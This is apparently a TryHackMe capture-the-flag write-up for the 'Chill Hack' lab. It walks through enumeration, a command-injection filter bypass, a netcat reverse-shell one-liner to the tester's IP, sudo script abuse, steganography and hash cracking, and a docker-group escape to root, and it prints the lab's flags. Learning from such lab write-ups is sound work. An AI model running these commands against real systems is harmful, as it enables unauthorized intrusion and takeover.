---
layout: default
title: "TryHackMe: Chill Hack"
date: 2026-03-29
---

# ./ TryHackMe/Chill_Hack:~# 

> **Machine:** Chill Hack
> **Difficulty:** Easy
> **Techniques:** Command Injection, Steganography, Misconfigured Sudo, Credential Harvesting

---

<img width="283" height="254" alt="image" src="https://github.com/user-attachments/assets/a7c07f4f-2b4b-43f9-ab7b-654b23f4b4c8" />



### [~] Enumeration:~#

Standard Nmap scan to identify the attack surface:

```bash
> nmap -sVC <ip adress>
```
```
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.73.207
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Game Info
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

I logged in on the ftp server with anonymous login and found a note.txt
```
> cat note.txt

Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```
Ok there are filteriing on strings, but where.

I proceeded to the webpage on port 80 to check the content.

### [!] Web_Exploitation:~#

<img width="720" height="449" alt="image" src="https://github.com/user-attachments/assets/0ebeafb7-8f43-4b4d-a337-e60a827c4217" />

Using ffuf, I found a directory /secret
<img width="720" height="456" alt="image" src="https://github.com/user-attachments/assets/c57b74b8-4cbc-4b81-a16f-91891ea0c08e" />

The web server hosts a "Command Panel." It attempts to filter common shell commands just like we read from the note on the ftp server, but I found I could bypass the filter using backslashes (\) or by chaining commands.

<img width="720" height="322" alt="image" src="https://github.com/user-attachments/assets/5f2ab1a2-8237-4805-88a9-53518343a397" />

I proceeded to get a reverse shell back to my machine
`r\\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.73.207 1337 >/tmp/f`


### [#] Lateral_Movement:~#
I found a .helpline.sh script in the home directory of apaar
Running sudo -l shows we can run the script as apaar
When I ran the script, we are asked for some input. I first thought of editing the script to put my shell but no luck then I checked the script and how it processes user input. Then I decided to put /bin/bash as input for the $person and $msg. We got a shell as apaar
<img width="720" height="286" alt="image" src="https://github.com/user-attachments/assets/5ece38a4-640e-4ea3-a87a-86829781397a" />

As apaar, I can read the user flag
```
apaar@ubuntu:~$ ls
ls
local.txt
apaar@ubuntu:~$ cat local.txt
cat local.txt
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
```

While enumerating further, I see a directory `files` in /var/www alongside the html directory
```
apaar@ubuntu:/var/www$ ls
ls
files  html
```
The `files` directory contains 4 files, including index.php, interesting.
<img width="476" height="163" alt="image" src="https://github.com/user-attachments/assets/8a0e395a-99ea-485c-8fbf-eb0962874a52" />

The index.php file contains database creds
<img width="720" height="337" alt="image" src="https://github.com/user-attachments/assets/2f701f68-38bf-41ab-8f2c-1095f4d894f2" />

I proceeded to login to the database with these creds and found two users and their password hashes
<img width="720" height="114" alt="image" src="https://github.com/user-attachments/assets/362f2607-50ad-4014-9cc7-87dff0d6f5d5" />
The hashes were crackable but I tried loggin in with them, no luck

I went back to the `files` folder from earlier, we had an images directory. I copied the images to my local machine to see if I can get something from it.
I ran stegseek on the jpeg image and a file was extracted, it was a zipped file.

<img width="577" height="151" alt="image" src="https://github.com/user-attachments/assets/d0f3a233-488c-47fa-a11c-e797d12c101b" />

The zipped file had a password so I used zip2john to get the hash and try to crack the resulting hash
<img width="720" height="175" alt="image" src="https://github.com/user-attachments/assets/378c358f-c595-4f10-8720-40f82f6e5f53" />

I was able to unlock the zipped file and got a source_code.php file which contained the creds for the `anurodh` user
<img width="720" height="433" alt="image" src="https://github.com/user-attachments/assets/bb81fd2b-d709-45e1-af9c-f0fcbd246a4f" />

### Privilege_Escalation:~#
The `anurodh` user was in a docker group telling us that we're in a docker group
I used gtfobins to get the command for escaping a docker environment
<img width="720" height="173" alt="image" src="https://github.com/user-attachments/assets/2833ded1-251b-400f-8fa2-00b233e66e52" />

```
anurodh@ubuntu:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
ls
# bin    dev   initrd.img      lib64  mnt   root  snap      sys  var
boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
cdrom  home  lib      media  proc  sbin  swap.img  usr  vmlinuz.old
# whoami
root
# cd /root
# ls
proof.txt
# cat proof.txt

     {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}


Congratulations! You have successfully completed the challenge.


         ,-.-.     ,----.                                             _,.---._    .-._           ,----.  
,-..-.-./  \==\ ,-.--` , \   _.-.      _.-.             _,..---._   ,-.' , -  `. /==/ \  .-._ ,-.--` , \ 
|, \=/\=|- |==||==|-  _.-` .-,.'|    .-,.'|           /==/,   -  \ /==/_,  ,  - \|==|, \/ /, /==|-  _.-` 
|- |/ |/ , /==/|==|   `.-.|==|, |   |==|, |           |==|   _   _\==|   .=.     |==|-  \|  ||==|   `.-. 
 \, ,     _|==/==/_ ,    /|==|- |   |==|- |           |==|  .=.   |==|_ : ;=:  - |==| ,  | -/==/_ ,    / 
 | -  -  , |==|==|    .-' |==|, |   |==|, |           |==|,|   | -|==| , '='     |==| -   _ |==|    .-'  
  \  ,  - /==/|==|_  ,`-._|==|- `-._|==|- `-._        |==|  '='   /\==\ -    ,_ /|==|  /\ , |==|_  ,`-._ 
  |-  /\ /==/ /==/ ,     //==/ - , ,/==/ - , ,/       |==|-,   _`/  '.='. -   .' /==/, | |- /==/ ,     / 
  `--`  `--`  `--`-----`` `--`-----'`--`-----'        `-.`.____.'     `--`--''   `--`./  `--`--`-----``  


--------------------------------------------Designed By -------------------------------------------------------
     |  Anurodh Acharya |
     ---------------------

                       Let me know if you liked it.

Twitter
 - @acharya_anurodh
Linkedin
 - www.linkedin.com/in/anurodh-acharya-b1937116a
```






